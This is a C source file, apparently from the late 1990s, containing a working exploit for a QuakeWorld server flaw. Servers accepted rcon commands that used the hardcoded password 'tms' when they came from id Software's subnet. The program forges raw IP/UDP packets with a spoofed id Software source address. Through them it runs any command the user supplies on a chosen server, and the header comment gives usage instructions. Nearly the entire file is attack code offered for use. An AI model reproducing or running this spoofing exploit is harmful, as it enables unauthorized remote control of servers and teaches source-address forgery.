/* rcon.c
  Quake  world rcon_password bug implimentation by Jeff Roberson,  
<jroberson at chesapeake.net> (VallaH)
  Linux 2.0.33 source, will compile on BSD if you modify the ip  
header etc.
  Please note that I did not discover this, I simply wrote the code.
  Thanks to Nick Toomey, <ntoomey at chesapeake.net> (Grifter)

  Brief summary:
      Any rcon command coming from the idsoftware subnet 192.246.40  
with the rcon password of tms will be accepted on any server.  This  
program simply spoofs a packet from vader.idsoftware.com (random  
pick) to whatever server you identify.

  Usage:
        ./rcon ip/host "what you want to do" [port]
  Example:
        ./rcon quake.idsoftware.com "say This program works, thanks  
Jeff" 27500
         the port argument is optional, you may omit it if you like  
and it will default to 27500.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#define SIP "192.25.136.1" /* vader.idsoftware.com */

#define command "ÿÿÿÿrcon tms "

u_long resolve_address(u_char *host)
{
        struct	in_addr	addr;
        struct	hostent	*he;

        if((addr.s_addr = inet_addr(host)) == -1) {
                if (!(he = gethostbyname(host))) {
                        printf("Unknown address: %s\n", host);
                        exit(-1);
                }
                bcopy(he->h_addr, (char *)&addr.s_addr, he->h_length);
        }
        return(addr.s_addr);
}
int main(int argc, char **argv)
{
        int	s;
        int	port=27500;
        char	buf[512];
        struct	sockaddr_in dst;
        struct	ip *iph=(struct ip *)buf;
        struct	udphdr *udp=(struct udphdr *)(buf + 20);

        if (argc<3) {
                printf("usage:\n");
                printf("\t%s ip ""command"" <port>\n", argv[0]);
                exit(-1);		
        }	
        if (argc==4) port = atoi(argv[3]);
        bzero(buf, sizeof(buf));
        bzero((char *)&dst, sizeof(dst));

        iph->ip_v=4;
        iph->ip_hl=5;
        iph->ip_tos=0;
        iph->ip_len=htons(sizeof(buf));
        iph->ip_id=htons(1234);
        iph->ip_off=0;
        iph->ip_ttl=255;
        iph->ip_p=17;

        iph->ip_src.s_addr=inet_addr(SIP);
        iph->ip_dst.s_addr=resolve_address(argv[1]);

        udp->uh_sport=htons(1234);
        udp->uh_dport=htons(port);
        udp->uh_ulen=htons(sizeof(buf) - 20);

        dst.sin_family=PF_INET;
        dst.sin_addr.s_addr=iph->ip_dst.s_addr;
        dst.sin_port=htons(27500);

        sprintf((buf + 28), "%s%s\n", command, argv[2]);

        if ((s=socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket");
                exit(-1);
        }

        if ((sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst,  
sizeof(dst))) <=0) {
                perror("sendto");
                exit(-1);
        }
        exit(1);
}
